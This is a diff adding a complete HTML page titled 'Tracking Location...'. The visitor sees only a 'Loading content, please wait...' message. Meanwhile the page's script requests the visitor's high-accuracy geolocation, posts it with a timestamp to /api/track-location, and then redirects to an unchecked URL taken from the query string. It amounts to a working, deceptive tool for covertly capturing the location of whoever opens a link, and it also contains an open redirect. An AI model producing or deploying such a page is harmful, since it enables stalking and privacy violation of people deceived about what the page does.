@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Tracking Location...</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-gray-100 min-h-screen flex flex-col items-center justify-center p-4">
+  <div class="bg-white rounded-lg shadow-lg p-8 max-w-lg w-full text-center">
+    <h1 class="text-2xl font-bold mb-6">Loading content, please wait...</h1>
+    <p id="status" class="text-gray-700 mb-4">Preparing your page...</p>
+    <div id="error" class="text-red-600"></div>
+  </div>
+
+  <script>
+    const statusEl = document.getElementById('status');
+    const errorEl = document.getElementById('error');
+
+    function sendLocation(latitude, longitude) {
+      fetch('/api/track-location', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ latitude, longitude, timestamp: Date.now() }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        statusEl.textContent = 'Location sent successfully. Redirecting...';
+        // Redirect to original URL after short delay
+        const urlParams = new URLSearchParams(window.location.search);
+        const redirectUrl = urlParams.get('redirect');
+        if (redirectUrl) {
+          setTimeout(() => {
+            window.location.href = redirectUrl;
+          }, 2000);
+        } else {
+          statusEl.textContent += ' No redirect URL provided.';
+        }
+      })
+      .catch(err => {
+        errorEl.textContent = 'Failed to send location: ' + err.message;
+      });
+    }
+
+    function errorHandler(error) {
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          errorEl.textContent = "User denied the request for Geolocation.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          errorEl.textContent = "Location information is unavailable.";
+          break;
+        case error.TIMEOUT:
+          errorEl.textContent = "The request to get user location timed out.";
+          break;
+        default:
+          errorEl.textContent = "An unknown error occurred.";
+          break;
+      }
+      statusEl.textContent = '';
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          statusEl.textContent = 'Location obtained. Sending...';
+          sendLocation(position.coords.latitude, position.coords.longitude);
+        },
+        errorHandler,
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    } else {
+      errorEl.textContent = 'Geolocation is not supported by this browser.';
+      statusEl.textContent = '';
+    }
+  </script>
+</body>
+</html>
